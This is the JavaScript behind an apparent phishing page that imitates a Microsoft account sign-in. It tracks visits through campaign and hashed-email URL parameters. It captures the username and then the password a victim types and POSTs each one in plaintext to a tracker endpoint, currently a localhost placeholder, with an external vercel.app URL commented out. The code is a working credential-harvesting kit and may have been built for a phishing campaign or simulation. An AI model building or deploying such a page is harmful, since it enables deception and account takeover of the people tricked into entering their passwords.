document.addEventListener('DOMContentLoaded', () => {
    // Redirect to Office.com immediately and dont perform any further actions.
    // window.location.href = "https://www.office.com";
      

    // Tracker functions
    function getParameters() {
        const urlParams = new URLSearchParams(window.location.search);
        const hashEmail = urlParams.get('hashEmail');
        const campaignId = urlParams.get('campaignId');
        // if (!campaignId || !hashEmail) {
        //     window.location.href = "https://www.siloamhospitals.com";
        // }
        return [campaignId, hashEmail];
    }

    function sendToTrackerAPI(httpMethod, campaignId, type, hashEmail, payload = null) {
        // const trackerApiUrl = `https://campaign-ruddy.vercel.app/api/t/${campaignId}/${type}/${hashEmail}`;
        const trackerApiUrl = `https://localhost/api/t/${campaignId}/${type}/${hashEmail}`; //dummy tracker
        const fetchOptions = {
            method: httpMethod.toUpperCase(),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        };

        if (httpMethod.toUpperCase() === 'POST' && payload) {
            fetchOptions.body = payload;
        }

        return fetch(trackerApiUrl, fetchOptions)
            .then(response => {
                if (!response.ok) throw new Error("Network Error");
                return response.json();
            })
            .then(data => {
                console.log(data);
                return data;
            })
            .catch(error => {
                console.error("Tracker Error:", error);
            });
    }

    function trackPageLoad() {
        const param = getParameters();
        if (param[0] && param[1]) {
            sendToTrackerAPI('GET', param[0], 'url', param[1]);
        } else {
            console.error('URL Not Completed.');
        }
    }

    trackPageLoad(); // Initial page view tracking

    // Original logic
    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "Please enter the password for your account.";

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');

    let view = "uname";
    let unameVal = false, pwdVal = false;

    const nxt = document.getElementById('btn_next');
    const sig = document.getElementById('btn_sig');

    function showLoading(duration, callback) {
        const loadingSection = document.getElementById('section_loading');
        loadingSection.classList.remove('d-none');

        document.getElementById('section_uname').classList.add('d-none');
        document.getElementById('section_pwd').classList.add('d-none');
        document.getElementById('section_final').classList.add('d-none');

        setTimeout(() => {
            loadingSection.classList.add('d-none');
            callback();
        }, duration);
    }

    document.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (view === "uname") {
                nxt.click();
            } else if (view === "pwd") {
                sig.click();
            }
        }
    });

    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            showLoading(1200, () => {
                document.getElementById("section_pwd").classList.remove('d-none');
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = unameInp.value;
                });
                view = "pwd";

                const [campaignId, hashEmail] = getParameters();
                sendToTrackerAPI('POST', campaignId, 'fill', hashEmail, `username=${encodeURIComponent(unameInp.value)}`);
            });
        }
    });

    sig.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            showLoading(1500, () => {
                document.getElementById("section_pwd").classList.add('d-none');
                document.getElementById('section_final').classList.remove('d-none');
                view = "final";

                const [campaignId, hashEmail] = getParameters();
                sendToTrackerAPI('POST', campaignId, 'fill', hashEmail, `password=${encodeURIComponent(pwdInp.value)}`);
            });
        }
    });

    function validate() {
        function unameValAction(valid) {
            if (!valid) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(valid) {
            if (!valid) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            unameValAction(unameInp.value.trim() !== "");
        } else if (view === "pwd") {
            pwdValAction(pwdInp.value.trim() !== "");
        }
    }

    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.add('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});
